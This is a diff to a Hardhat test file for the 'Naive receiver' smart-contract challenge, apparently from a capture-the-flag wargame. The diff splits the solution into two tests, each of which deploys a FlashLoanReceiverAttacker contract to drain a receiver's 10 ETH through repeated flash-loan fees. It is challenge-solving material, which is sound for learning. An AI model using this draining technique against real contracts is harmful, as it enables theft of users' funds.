@@ -11,7 +11,7 @@ describe("[Challenge] Naive receiver", function () {
   // Receiver has 10 ETH in balance
   const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
 
-  before(async function () {
+  beforeEach(async function () {
     /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
     [deployer, user, player] = await ethers.getSigners();
 
@@ -53,7 +53,7 @@ describe("[Challenge] Naive receiver", function () {
     );
   });
 
-  it("Execution", async function () {
+  it("Execution (not-so-smart way)", async function () {
     /** CODE YOUR SOLUTION HERE */
     const ETH = await pool.ETH();
     const FlashLoanReceiverAttackerFactory = await ethers.getContractFactory(
@@ -66,13 +66,26 @@ describe("[Challenge] Naive receiver", function () {
       receiver.address
     );
 
-    // Not-so-smart way
-    // await attacker.flashLoanAttack(10, 1, "0x");
-    // Smart way
+    await attacker.flashLoanAttack(10, 1, "0x");
+  });
+
+  it("Execution (smart way)", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    const ETH = await pool.ETH();
+    const FlashLoanReceiverAttackerFactory = await ethers.getContractFactory(
+      "FlashLoanReceiverAttacker",
+      deployer
+    );
+    attacker = await FlashLoanReceiverAttackerFactory.deploy(
+      ETH,
+      pool.address,
+      receiver.address
+    );
+
     await attacker.flashLoanAttackAuto(1, "0x");
   });
 
-  after(async function () {
+  afterEach(async function () {
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
     // All ETH has been drained from the receiver
